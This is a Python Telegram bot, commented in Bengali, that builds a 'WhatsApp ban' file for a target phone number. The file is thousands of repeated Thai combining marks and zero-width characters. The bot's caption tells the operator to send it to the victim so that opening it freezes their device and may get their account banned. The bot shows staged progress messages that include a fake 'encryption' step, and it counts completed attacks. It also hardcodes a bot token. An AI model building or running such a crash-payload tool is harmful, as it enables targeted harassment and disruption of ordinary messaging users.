import logging
import sqlite3
import os
import asyncio
import time
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ১. লগিং সেটআপ (সার্ভার মনিটরিং)
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ২. কনফিগারেশন
TOKEN = "8675593212:AAEq_tOcW7hMLZwJvqUt_Os6V7h7JEozB0E"
ADMIN_ID = 6856009995 

# ৩. ডেটাবেস সেটআপ
def init_db():
    conn = sqlite3.connect('m_r_developer_live_v4.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, count INTEGER)''')
    cursor.execute("INSERT OR IGNORE INTO stats (id, count) VALUES (1, 0)")
    conn.commit()
    conn.close()

# ৪. পেলোড তৈরির ফাংশন (লাইভ প্রগ্রেস লজিকসহ)
async def generate_ban_file_live(target, status_msg):
    filename = f"WHATSAPP_BAN_{target}.txt"
    crash_chars = "\u0E47\u0E48\u0E49\u0E4A\u0E4B\u0E4C\u0E4D" * 30
    invisible = "\u200B\u200C\u200D\uFEFF" * 30
    chunk = (crash_chars + invisible) * 500
    
    try:
        # লাইভ আপডেট ১
        await status_msg.edit_text(f"⏳ `{target}` এর জন্য ডাটা স্ট্রাকচার তৈরি হচ্ছে (১০%)...", parse_mode='Markdown')
        await asyncio.sleep(1)
        
        with open(filename, "w", encoding="utf-8") as f:
            for i in range(1, 1001):
                f.write(chunk)
                # প্রতি ২৫০ লুপে লাইভ আপডেট দেখাবে
                if i == 250:
                    await status_msg.edit_text(f"⏳ পেলোড রাইট হচ্ছে (৪০%)...", parse_mode='Markdown')
                elif i == 500:
                    await status_msg.edit_text(f"⏳ বাফার মেমোরি লোড হচ্ছে (৭০%)...", parse_mode='Markdown')
                elif i == 750:
                    await status_msg.edit_text(f"⏳ ফাইল এনক্রিপশন সম্পন্ন হচ্ছে (৯০%)...", parse_mode='Markdown')
        
        await status_msg.edit_text(f"✅ ১০০% সম্পন্ন! ফাইল পাঠানো হচ্ছে...", parse_mode='Markdown')
        return filename
    except Exception as e:
        logger.error(f"Error: {e}")
        return None

# ৫. স্টার্ট কমান্ড (স্থায়ী ড্যাশবোর্ড বাটন)
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Access Denied! আপনি এই বটের অ্যাডমিন নন।")
        return

    # কিবোর্ড বাটন যা টাইপিং বক্সের উপরে থাকবে
    keyboard = [
        [KeyboardButton("🚀 Attack WhatsApp")],
        [KeyboardButton("📊 Check Stats")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, persistent=True)
    
    welcome_text = (
        "🔥 **M R DEVELOPER LIVE DASHBOARD** 🔥\n\n"
        f"স্বাগতম বস! আপনার আইডি `{user_id}` ভেরিফাইড।\n"
        "নিচের বাটনগুলো আপনার কিবোর্ডের উপরে সেট করা হয়েছে।"
    )
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')

# ৬. মেনু এবং মেসেজ হ্যান্ডলার
async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID: return

    text = update.message.text

    if text == "🚀 Attack WhatsApp":
        await update.message.reply_text("📱 টার্গেট নম্বরটি দিন (যেমন: 8801XXXXXXXXX):")
        context.user_data['state'] = 'GET_TARGET'
    
    elif text == "📊 Check Stats":
        conn = sqlite3.connect('m_r_developer_live_v4.db')
        cur = conn.cursor()
        cur.execute("SELECT count FROM stats WHERE id=1")
        total = cur.fetchone()[0]
        conn.close()
        await update.message.reply_text(f"📊 **অপারেশন রিপোর্ট**\n\nমোট আইডি অ্যাটাক সম্পন্ন: {total} টি।")
    
    # নম্বর পাওয়ার পর প্রসেসিং শুরু
    elif context.user_data.get('state') == 'GET_TARGET':
        target_num = text
        context.user_data['state'] = None
        
        status_msg = await update.message.reply_text(f"🚀 মিশন শুরু হয়েছে: `{target_num}`", parse_mode='Markdown')
        
        # লাইভ প্রগ্রেসসহ ফাইল তৈরি
        file_path = await generate_ban_file_live(target_num, status_msg)
        
        if file_path and os.path.exists(file_path):
            try:
                with open(file_path, 'rb') as document:
                    await update.message.reply_document(
                        document=document,
                        caption=(
                            f"✅ **অপারেশন সাকসেসফুল!**\n\n"
                            f"টার্গেট: `{target_num}`\n\n"
                            "⚠️ এটি হোয়াটসঅ্যাপে ডকুমেন্ট হিসেবে পাঠান। ভিকটিম এটি ওপেন করলে তার সিস্টেম লুপে পড়ে ব্যান হওয়ার সম্ভাবনা থাকে।"
                        ),
                        parse_mode='Markdown'
                    )
                
                # ডেটাবেস আপডেট
                conn = sqlite3.connect('m_r_developer_live_v4.db')
                cur = conn.cursor()
                cur.execute("UPDATE stats SET count = count + 1 WHERE id=1")
                conn.commit()
                conn.close()
                
            except Exception as e:
                await update.message.reply_text(f"❌ এরর: {str(e)}")
            finally:
                if os.path.exists(file_path): os.remove(file_path)
        else:
            await update.message.reply_text("❌ দুঃখিত! ফাইল তৈরিতে সমস্যা হয়েছে।")
        
        await status_msg.delete()

# ৭. মেইন ফাংশন
def main():
    init_db()
    # Conflict এড়াতে এবং ব্যাকগ্রাউন্ড প্রসেস সচল রাখতে drop_pending_updates
    application = Application.builder().token(TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_interaction))
    
    print("M R DEVELOPER Bot is Live with Live-Progress Updates...")
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
    
